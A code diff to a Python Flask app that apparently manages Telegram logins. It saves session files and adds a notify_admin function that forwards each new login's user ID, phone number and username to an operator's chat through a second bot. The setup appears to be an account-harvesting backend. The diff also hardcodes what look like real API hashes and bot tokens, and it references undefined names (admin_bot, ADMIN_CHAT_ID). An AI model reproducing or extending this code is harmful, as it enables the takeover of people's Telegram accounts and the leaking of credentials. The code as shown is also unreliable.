@@ -17,7 +17,9 @@ from database import get_db, init_db
 API_ID = 25780325
 API_HASH = "2c4cb6eee01a46dc648114813042c453"
 BOT_TOKEN = "8485200508:AAEIwbb9HpGBUX_mWPGVplpxNRoXXnlSOrU"
-ADMIN_ID = 515902673  # admin bot user id
+
+ADMIN_ID = 515902673
+ADMIN_BOT_TOKEN = "8455652640:AAE0Mf0haSpP_8yCjZTCKAqGQAcVF4kf02s"
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
@@ -150,16 +152,27 @@ def finalize_login(client, phone):
     conn.commit()
     conn.close()
 
-    send_admin_message(
-        f"✅ Yangi login\n"
-        f"👤 ID: {user_id}\n"
-        f"📞 {username}"
-    )
-
     client.disconnect()
     pending.pop(phone, None)
 
     return jsonify({"status": "success"})
+
+def notify_admin(user_id: str, phone: str, username: str | None = None):
+    async def _send():
+        text = (
+            "🔐 Yangi login\n\n"
+            f"👤 User ID: {user_id}\n"
+            f"📱 Phone: {phone}\n"
+        )
+        if username:
+            text += f"👤 Username: @{username}"
+
+        await admin_bot.send_message(ADMIN_CHAT_ID, text)
+
+    def runner():
+        asyncio.run(_send())
+
+    threading.Thread(target=runner, daemon=True).start()
 
 
 # ======================
@@ -168,6 +181,7 @@ def finalize_login(client, phone):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
